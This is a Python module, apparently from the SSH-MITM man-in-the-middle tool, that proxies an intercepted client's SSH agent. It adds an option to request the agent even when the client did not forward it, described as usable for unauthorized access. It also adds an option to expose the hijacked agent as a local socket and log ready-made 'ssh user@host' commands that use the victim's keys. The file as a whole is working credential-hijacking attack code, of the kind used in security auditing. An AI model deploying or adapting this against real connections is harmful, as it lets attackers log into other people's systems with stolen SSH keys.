import contextlib
import logging
import os
import select
import socket
import tempfile
import threading
import time
import uuid
from pathlib import Path

from colored.colored import attr, fg
from paramiko.agent import Agent, AgentClientProxy, AgentKey, AgentServerProxy
from paramiko.channel import Channel
from paramiko.ssh_exception import ChannelException
from paramiko.transport import Transport

from sshmitm.core.agent import AgentBaseForwarder
from sshmitm.moduleparser.colors import Colors


class AgentProxy:
    def __init__(self, transport: Transport) -> None:
        self.agents: list[Agent | AgentClientProxy] = []
        self.transport = transport
        self.local_socket: AgentLocalSocket | None = None
        agent_proxy = AgentServerProxy(self.transport)
        os.environ.update(agent_proxy.get_env())
        agent_proxy.connect()
        self.agent = Agent()
        self.keys = self.agent.get_keys()[:]
        self.agents.append(self.agent)
        # should be able to be closed now, but for some reason there is a race
        # agent is still sending over the channel
        # agent.close()  # noqa: ERA001

    def get_keys(self) -> tuple[AgentKey, ...]:
        return self.keys

    def forward_agent(self, client_channel: Channel) -> bool:
        return client_channel.request_forward_agent(self._forward_agent_handler)

    def _forward_agent_handler(self, remote_channel: Channel) -> None:
        agent = AgentServerProxy(self.transport)
        os.environ.update(agent.get_env())
        time.sleep(0.1)
        self.agents.append(AgentClientProxy(remote_channel))

    def close(self) -> None:
        if self.local_socket is not None:
            self.local_socket.close()
        for agent_proxy in self.agents:
            agent_proxy.close()


class AgentLocalSocket:
    """Exposes the client's forwarded SSH agent as a local Unix domain socket.

    Opens a server socket under ``/tmp`` and, for each incoming connection,
    opens a fresh agent-forwarding channel through the SSH transport.  The two
    sides are bridged at the raw byte level so any standard agent client
    (ssh-add, ssh-keygen, …) can use it by pointing SSH_AUTH_SOCK at the path.
    """

    def __init__(self, transport: Transport) -> None:
        self.transport = transport
        self.socket_path = os.path.join(
            tempfile.gettempdir(), f"ssh-mitm-{uuid.uuid4().hex[:8]}.agent"
        )
        self._server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self._server.bind(self.socket_path)
        self._server.listen(5)
        self._running = True
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def _accept_loop(self) -> None:
        while self._running:
            try:
                readable = select.select([self._server], [], [], 0.5)[0]
                if not readable:
                    continue
                client_sock, _ = self._server.accept()
                threading.Thread(
                    target=self._handle, args=(client_sock,), daemon=True
                ).start()
            except OSError:
                break

    def _handle(self, client_sock: socket.socket) -> None:
        proxy = AgentServerProxy(self.transport)
        sock_path = proxy.get_env()["SSH_AUTH_SOCK"]
        proxy.connect()
        agent_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            agent_sock.connect(sock_path)
            self._bridge(client_sock, agent_sock)
        except Exception:  # noqa: BLE001 # pylint: disable=broad-exception-caught
            logging.debug("agent local socket: connection error", exc_info=True)
        finally:
            agent_sock.close()
            client_sock.close()

    def _bridge(self, a: socket.socket, b: socket.socket) -> None:
        while True:
            try:
                readable, _, err = select.select([a, b], [], [a, b], 5.0)
                if err:
                    break
                for src in readable:
                    dst = b if src is a else a
                    data = src.recv(4096)
                    if not data:
                        return
                    dst.sendall(data)
            except OSError:
                return

    def close(self) -> None:
        self._running = False
        with contextlib.suppress(OSError):
            self._server.close()
        with contextlib.suppress(OSError):
            Path(self.socket_path).unlink()


class AgentForwarder(AgentBaseForwarder):
    """Forwards the SSH agent from the client, with optional breakin support."""

    @classmethod
    def parser_arguments(cls) -> None:
        plugin_group = cls.argument_group()
        plugin_group.add_argument(
            "--request-agent-breakin",
            dest="request_agent_breakin",
            action="store_true",
            help="Enables SSH-MITM to request the SSH agent from the client, even if the client does not forward the agent. Can be used to attempt unauthorized access.",
        )
        plugin_group.add_argument(
            "--expose-agent-socket",
            dest="expose_agent_socket",
            action="store_true",
            help=(
                "Expose the client's forwarded SSH agent as a local Unix socket. "
                "Prints ready-to-use SSH_AUTH_SOCK commands to the log. "
                "Works for SSH, SCP, and SFTP sessions (OpenSSH 8.4+). "
                "See https://docs.ssh-mitm.at/user_guide/sshagent.html"
            ),
        )

    def request(self, existing_agent: AgentProxy | None = None) -> AgentProxy | None:
        if existing_agent is not None and not self.args.request_agent_breakin:
            return existing_agent
        try:
            if self.session.agent_requested.wait(1) or self.args.request_agent_breakin:
                agent = self.session.proxyserver.create_agent_proxy(
                    self.session.transport
                )
                logging.info(
                    "%s %s - successfully requested ssh-agent",
                    Colors.emoji("information"),
                    Colors.stylize(
                        self.session.sessionid, fg("light_blue") + attr("bold")
                    ),
                )
                if self.args.expose_agent_socket:
                    self._expose_socket(agent)
                return agent
        except ChannelException:
            logging.info(
                "%s %s - ssh-agent breakin not successfull!",
                Colors.emoji("warning"),
                Colors.stylize(self.session.sessionid, fg("light_blue") + attr("bold")),
            )
            return existing_agent
        return existing_agent

    def _expose_socket(self, agent: AgentProxy) -> None:
        agent.local_socket = self.session.proxyserver.create_agent_local_socket(
            self.session.transport
        )
        sock = agent.local_socket.socket_path
        sid = Colors.stylize(self.session.sessionid, fg("light_blue") + attr("bold"))

        def _cmd(suffix: str) -> str:
            return str(
                Colors.stylize(
                    f"SSH_AUTH_SOCK={sock} {suffix}", fg("light_blue") + attr("bold")
                )
            )

        logging.info(
            "%s %s - agent socket ready - docs: https://docs.ssh-mitm.at/user_guide/sshagent.html",
            Colors.emoji("information"),
            sid,
        )
        logging.info(
            "%s %s - ssh-add:  %s", Colors.emoji("information"), sid, _cmd("ssh-add -l")
        )
        logging.info(
            "%s %s - ssh:      %s",
            Colors.emoji("information"),
            sid,
            _cmd("ssh user@host"),
        )
